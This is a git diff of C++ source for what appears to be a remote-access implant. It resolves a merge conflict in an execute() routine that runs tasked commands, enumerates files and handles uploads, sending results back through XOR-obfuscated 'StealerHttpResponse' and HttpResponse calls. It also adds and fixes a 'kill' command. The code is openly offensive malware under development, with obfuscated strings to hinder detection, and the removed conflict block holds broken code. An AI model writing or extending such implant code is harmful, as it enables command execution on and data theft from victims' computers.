@@ -7,6 +7,7 @@
 - Execution <arg> - List command to run
 - File_Enumeration <arg> - List files in the directory
 - File Upload
+- kill
  */
 void execute(std::string command, std::string args, int task_id, int implant_id){
 
@@ -59,25 +60,13 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
         }
         catch(...){
-<<<<<<< HEAD
-            //this line was changed
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, xor_string("NIADML",0x28), xor_string("NIAD]ZM",0x28), command);
-            //StealerHttpResponse(xor_string("\nW@VUJKV@zVQ@DI@W",0x25), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
             work = xor_string("fG",0x28);
         }
         if(work.compare(xor_string("fG",0x28)) == 1){
-            printf("IN WORK COMPARE\n");
-            StealerHttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results_parse, xor_string("NIAD]ZM",0x28), command);
-            //HttpResponse(xor_string("\nW@VUJKV@zVQ@DI@W",0x25), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
-=======
-            StealerHttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
-            work = xor_string("fG",0x28);
+            StealerHttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
         }
-        if(work.compare(xor_string("fG",0x28)) == 1){
-            HttpResponse(xor_string(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
->>>>>>> 6698284f9f7801aed5cae9efc27081b5873cdc97
-        }
-
+        
     }
 
     /* Execution */
@@ -151,7 +140,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
         
 
     }
-    if (command.compare("kill")){
+    if (command.compare("kill") == 0){
             printf("ABOUT TO EXIT\n");
             exit(0);
             abort();
